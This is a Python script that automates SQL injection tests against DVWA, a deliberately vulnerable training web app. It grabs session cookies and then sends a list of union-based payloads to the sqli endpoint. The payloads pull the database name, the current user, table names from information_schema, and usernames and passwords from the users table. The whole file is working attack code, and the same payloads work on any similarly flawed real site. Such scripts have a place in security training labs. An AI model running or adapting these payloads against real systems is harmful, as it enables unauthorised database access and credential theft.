import requests
import argparse
import urllib.parse
import time

def parse_args():
    parser = argparse.ArgumentParser(description="Automate SQL Injection Tests on DVWA")
    parser.add_argument('base_url', type=str, help="Base URL of the DVWA application (e.g., http://localhost)")
    return parser.parse_args()

def get_cookies(base_url):
    """Send an initial request to retrieve PHPSESSID & security level cookies."""
    url = f"{base_url}/dv/vulnerabilities/sqli/"
    response = requests.get(url)
    php_sessid = response.cookies.get("PHPSESSID", "unknown_session")
    security_level = response.cookies.get("security", "low")
    print(f"Obtained cookies: PHPSESSID={php_sessid}, security={security_level}")
    return php_sessid, security_level

def send_sql_injection_request(php_sessid, security_level, payload, referer, base_url):
    """Send a single SQL injection payload using requests."""
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = f"{base_url}/dv/vulnerabilities/sqli/?id={encoded_payload}&Submit=Submit"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": referer,
        "Cookie": f"security={security_level}; PHPSESSID={php_sessid}",
        "Connection": "keep-alive"
    }
    response = requests.get(url, headers=headers)
    return response, url

def test_sql_injection(php_sessid, security_level, payloads, base_url):
    """Runs SQL injection payloads in sequence, using the extracted cookies."""
    referer = f"{base_url}/dv/vulnerabilities/sqli/"
    delay = 5.1
    for index, payload in enumerate(payloads):
        response, new_referer = send_sql_injection_request(php_sessid, security_level, payload, referer, base_url)
        if "<pre>" in response.text:
            print(f"Success! SQL injection detected. Payload: {payload}")
        else:
            print(f"Failure. No SQL injection was triggered. Payload: {payload}")
        referer = new_referer
        if index < len(payloads) - 1:
            time.sleep(delay)

def main():
    args = parse_args()
    base_url = args.base_url
    payloads = [
        "1'",
        "1' and 1=1#",
        "1' and 1=1 union select database(), user()#",
        "1' and 1=1 union select null, table_name from information_schema.tables#",
        "1' and 1=1 union select user, password from users#",
        "1'",
        "1' and 1=1#",
        "1' and 1=1 union select database(), user()#",
        "1' and 1=1 union select null, table_name from information_schema.tables#",
        "1' and 1=1 union select user, password from users#",
        "1' and 1=1 union select null, table_name from information_schema.tables#",
        "1' and 1=1 union select user, password from users#"
    ]
    php_sessid, security_level = get_cookies(base_url)
    test_sql_injection(php_sessid, security_level, payloads, base_url)

if __name__ == "__main__":
    main()